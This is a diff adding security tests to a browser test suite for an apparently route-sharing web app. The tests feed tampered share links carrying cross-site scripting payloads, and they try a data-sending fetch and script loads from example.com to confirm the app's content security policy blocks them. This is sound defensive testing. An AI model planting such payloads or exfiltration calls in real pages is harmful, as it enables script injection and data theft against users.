@@ -239,6 +239,44 @@ module.exports = async function offline(browser, url) {
     await ctx.close();
   });
 
+  await S.test('Security: a tampered share link is refused, and text in a link is never run as code', async t => {
+    const b64 = o => Buffer.from(JSON.stringify(o)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    const good = { v: 1, o: [43.01, -88.24], d: [43.01, -88.22], s: [[43.016, -88.23]], p: '' };
+    const bad = { 'coordinates that are not numbers': { ...good, o: ['<img src=x onerror=alert(1)>', 0] }, 'a latitude off the globe': { ...good, d: [943, -88] }, 'stops that are not a list': { ...good, s: 'abc' }, 'hundreds of stops': { ...good, s: Array.from({ length: 500 }, () => [43, -88]) }, 'a stop holding text': { ...good, s: [[43, '-88<script>']] }, 'an oversized line': { ...good, p: 'a'.repeat(30000) } };
+    for (const [what, data] of Object.entries(bad)) {
+      const { ctx, page, errors } = await openApp(browser, url + '#r=' + b64(data), { mock: fakeServices() });
+      t.check(await page.evaluate(() => window.DMR.S.mode) === 'draw' && (await page.textContent('#toast')).includes('damaged'), `${what}: the link was accepted`);
+      t.check(errors.length === 0, `${what}: ` + errors.join('; '));
+      await ctx.close();
+    }
+    // Text fields carrying markup: shown as plain text, links still only ever point at Google and Apple.
+    const evil = '"><img src=x onerror="window.__pwned=1"><script>window.__pwned=1</script>';
+    const { ctx, page, errors } = await openApp(browser, url + '#r=' + b64({ ...good, n: evil, t: evil, on: evil, dn: 'javascript:alert(1)' }), { mock: fakeServices() });
+    await page.waitForFunction(() => window.DMR.S.mode === 'viewer'); await page.waitForTimeout(300);
+    t.check(await page.evaluate(() => window.__pwned) === undefined, 'markup from the link was run');
+    t.check(await page.locator('#sheet img, #sheet script').count() === 0, 'markup from the link became page elements');
+    const hrefs = await page.$$eval('#sheet a[href]', as => as.map(a => a.href));
+    t.check(hrefs.length >= 2 && hrefs.every(h => h.startsWith('https://www.google.com/maps/dir/') || h.startsWith('https://maps.apple.com/directions') || h.startsWith(new URL(url).origin)), 'a link points somewhere unexpected: ' + hrefs.join(' | '));
+    t.check((await page.textContent('#sheet')).includes('javascript:alert(1)'), 'the destination text the link carries is not shown to the person opening it');
+    t.check(errors.length === 0, errors.join('; '));
+    await ctx.close();
+  });
+
+  await S.test('Security: the page may only talk to the services it uses, and only run its own scripts', async t => {
+    const { ctx, page } = await openApp(browser, url, { mock: fakeServices() });
+    const csp = await page.getAttribute('meta[http-equiv="Content-Security-Policy"]', 'content');
+    t.check(csp && csp.includes("default-src 'none'") && csp.includes("script-src 'self'") && !/script-src[^;]*unsafe/.test(csp), 'the security policy is missing or allows inline scripts');
+    const out = await page.evaluate(async () => {
+      const tryFetch = await fetch('https://example.com/collect?x=1').then(() => 'sent', () => 'refused');
+      const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.body.appendChild(s);
+      const ext = await new Promise(res => { const e = document.createElement('script'); e.src = 'https://example.com/x.js'; e.onload = () => res('loaded'); e.onerror = () => res('refused'); document.body.appendChild(e); });
+      return { tryFetch, inline: window.__inline === 1, ext };
+    });
+    t.check(out.tryFetch === 'refused', 'the page could send data to a server it does not use');
+    t.check(!out.inline && out.ext === 'refused', 'the page ran a script that is not its own');
+    await ctx.close();
+  });
+
   await S.test('Damaged share link shows a message instead of a blank page', async t => {
     const { ctx, page, errors } = await openApp(browser, url + '#r=not-a-real-link', { mock: fakeServices() });
     t.check((await page.textContent('#sheet h2')).length > 0, 'nothing shown');
